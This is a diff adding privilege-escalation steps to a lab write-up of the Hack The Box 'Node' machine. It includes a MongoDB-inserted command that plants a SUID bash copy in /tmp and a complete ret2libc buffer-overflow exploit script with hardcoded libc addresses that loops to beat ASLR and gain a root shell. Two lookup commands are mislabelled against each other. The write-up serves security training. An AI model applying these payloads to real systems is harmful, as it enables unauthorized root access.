@@ -1,4 +1,4 @@
-# Machine
+# Node
 
 ## Machine Info
 
@@ -170,6 +170,8 @@ WriteResult({ "nInserted" : 1 })
 
 ![image-20231216173559044](./Node.assets/image-20231216173559044.png)
 
+- another method to get tom priv: cp bash file into /tmp and set it as suid, `db.tasks.insert({"cmd":"cp /bin/bash /tmp/tom;chown tom /tmp/tom;chmod +gs /tmp/tom;chmod +xs /tmp/tom;"})`
+
 ### tom -> root
 
 - find SUID file
@@ -190,7 +192,126 @@ WriteResult({ "nInserted" : 1 })
 
 ### backup buffer overflow
 
+- download the elf into local host: `scp mark@10.10.10.58:/tmp/backup ./backup`
+- file analysis:
+  - `file backup`
+  - `checksec backup`
 
+```bash
+$ file backup
+backup: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=343cf2d93fb2905848a42007439494a2b4984369, not stripped
+
+$ checksec backup
+[*] '/Node/priv/backup'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+```
+
+- remote machine's ALSR is on
+
+![image-20231216204017477](./Node.assets/image-20231216204017477.png)
+
+- backup usage: `backup -q <backup_key> <dir>`
+
+  - `-q`: quite mode
+
+  - `<backup_key>`: `45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474`
+
+  - `<dir>`: zip path
+
+![image-20231216203910681](./Node.assets/image-20231216203910681.png)
+
+- local debugging: make sure create a key file like this:
+
+![image-20231216203837239](./Node.assets/image-20231216203837239.png)
+
+![image-20231216203840635](./Node.assets/image-20231216203840635.png)
+
+- find the overflow point
+
+![image-20231216203902678](./Node.assets/image-20231216203902678.png)
+
+- **POC**: stack overflow
+
+![image-20231216203934189](./Node.assets/image-20231216203934189.png)
+
+Above all, the exploit method is **ret2libc**.
+
+#### find offset
+
+![image-20231216204134341](./Node.assets/image-20231216204134341.png)
+
+![image-20231216204137722](./Node.assets/image-20231216204137722.png)
+
+- `0x66616164` -> small endian (x86) -> 64 61 61 66 -> `daaf` -> cyclic -c daaf -> **512** Byte
+
+```
+          +-------------------------------------------+
+          |                                           |
+          |              return address               |
+          |                                           |
+          |                                           |
+    ----->+-------------------------------------------+
+          |                                           |
+          |              previous ebp                 |
+          |                                           |
+          |                                           |
+          +-------------------------------------------+
+          |                                           |
+512 Bytes |                                           |
+          |                                           |
+          |              local variables              |
+          |                                           |
+          |                                           |
+          |                                           |
+          |                                           |
+    ----->+-------------------------------------------+
+```
+
+#### find addresses of func and string
+
+1. find libc addr: `ldd /usr/local/bin/backup`
+2. find function system addr: `readelf -s /lib32/libc.so.6 | grep system`
+3. find string '/bin/sh' addr: `readelf -s /lib32/libc.so.6 | grep exit`
+4. find function exit addr: `strings -a -t x /lib32/libc.so.6 | grep '/bin/sh'`
+
+![image-20231216204252262](./Node.assets/image-20231216204252262.png)
+
+5. write exploit script
+
+```python
+import subprocess
+import struct
+
+libc = 0xf759b000
+system_func = libc + 0x0003a940
+exit_func = libc + 0x0002e7b0
+binsh_str = libc + 0x15900b
+padding_len = 512
+
+# Use struct.pack to ensure addresses are packed in little-endian format
+system_func_packed = struct.pack('<I', system_func)
+exit_func_packed = struct.pack('<I', exit_func)
+binsh_str_packed = struct.pack('<I', binsh_str)
+
+# Convert the padding 'A's to bytes and construct the payload
+payload = b'A' * padding_len + system_func_packed + exit_func_packed + binsh_str_packed
+
+# Call the vulnerable program with the crafted payload
+tries = 1
+while True:
+	print(f"try {tries} times ..."); tries += 1
+	subprocess.call(["/usr/local/bin/backup", "a", "45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474", payload])
+```
+
+6. execute exp.py and get root shell
+
+![image-20231216204336399](./Node.assets/image-20231216204336399.png)
+
+![image-20231216204340030](./Node.assets/image-20231216204340030.png)
 
 ## Exploit Chain
 
